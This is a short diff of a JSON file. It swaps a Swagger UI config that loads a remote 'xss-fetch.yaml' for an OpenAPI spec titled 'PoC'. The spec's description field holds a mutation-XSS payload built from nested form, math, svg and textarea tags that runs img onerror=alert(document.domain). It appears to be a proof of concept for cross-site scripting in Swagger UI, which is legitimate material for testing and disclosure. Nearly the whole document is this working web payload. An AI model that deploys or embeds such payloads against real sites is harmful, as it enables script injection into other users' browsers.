@@ -1,9 +1,9 @@
 {
-    "url": "https://raw.githubusercontent.com/delisyd/swagger_xss/refs/heads/main/xss-fetch.yaml",
-    "urls": [
-        {
-            "url": "https://raw.githubusercontent.com/delisyd/swagger_xss/refs/heads/main/xss-fetch.yaml",
-            "name": "Foo"
-        }
-    ]
-}
+    "openapi": "3.0.0",
+    "info": {
+      "title": "PoC",
+      "description": "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><a title=\"</textarea><img src onerror=alert(document.domain)>\">",
+      "version": "1.0"
+    },
+    "paths": {}
+  }
